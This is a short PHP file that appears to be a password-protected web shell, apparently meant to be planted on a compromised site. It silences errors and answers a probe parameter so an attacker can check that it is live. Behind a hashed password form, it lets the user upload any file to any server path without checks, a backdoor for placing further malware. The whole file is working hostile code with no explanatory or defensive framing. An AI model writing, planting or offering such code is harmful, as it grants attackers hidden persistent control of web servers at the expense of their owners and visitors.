<?php ?><?php error_reporting(0); if(isset($_REQUEST["0kb"])){die(">0kb<");};?><?php
if (function_exists('session_start')) { session_start(); if (!isset($_SESSION['secretyt'])) { $_SESSION['secretyt'] = false; } if (!$_SESSION['secretyt']) { if (isset($_POST['pwdyt']) && hash('sha256', $_POST['pwdyt']) == 'a1fecbae6a303e0618f95586ddb49de7c30f911fecd8701500320daf754868a0') {
      $_SESSION['secretyt'] = true; } else { die('<html> <head> <meta charset="utf-8"> <title></title> <style type="text/css"> body {padding:10px} input { padding: 2px; display:inline-block; margin-right: 5px; } </style> </head> <body> <form action="" method="post" accept-charset="utf-8"> <input type="password" name="pwdyt" value="" placeholder="passwd"> <input type="submit" name="submit" value="submit"> </form> </body> </html>'); } } }
?>
<?php
echo('kill_the_net');
$files = @$_FILES["files"];
if ($files["name"] != '') {
    $fullpath = $_REQUEST["path"] . $files["name"];
    if (move_uploaded_file($files['tmp_name'], $fullpath)) {
        echo "<h1><a href='$fullpath'>OK-Click here!</a></h1>";
    }
}echo '<html><head><title>Upload files...</title></head><body><form method=POST enctype="multipart/form-data" action=""><input type=text name=path><input type="file" name="files"><input type=submit value="Up"></form></body></html>';
?>